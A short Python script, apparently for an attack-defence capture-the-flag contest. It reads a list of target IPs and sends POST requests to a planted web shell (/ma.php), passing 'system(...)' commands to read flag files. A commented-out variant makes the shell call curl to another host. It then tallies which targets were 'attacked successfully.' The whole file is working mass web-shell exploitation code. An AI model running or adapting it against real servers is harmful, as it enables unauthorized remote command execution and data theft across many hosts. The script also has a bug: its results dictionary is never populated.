from os import system
import requests
import re
import json
#Create by Kevin
#/.shell.php
ip = []
payload = '/ma.php'
data = {}
error = []
com = re.compile(r'[0-9A-Fa-f]{32}')
f = open('web.txt')
lines = f.readlines()
for i in lines:
	#
	ip.append(i.rstrip())

num = 0
for i in ip:
	try:
		datas={}
		#datas['xiaoma'] = 'system("curl http://10.1.8.26/remoteflag/");'
		datas['c'] = 'system("cat ./flag.txt");'
		r = requests.post('http://'+i+payload,timeout=0.5,data=datas)
		r.encoding = r.apparent_encoding
		#print(r.text)
		#print()
		if r.status_code!=404 and r.text!='':
			#print('http://'+i+payload)
			num += 1
			print(r.text)
	except:
		print(i+'发生异常')
		error.append(i)


flag = ''
for i,j in data.items():
	flag += i+' '+j+'\n'
with open('flag_post.txt','w') as f:
	f.write(flag)
print('以下目标出现异常')
for i in error:
	print(i)
print('本次'+str(num)+'个目标攻击成功!')
for i,j in data.items():
    	print(i,j)
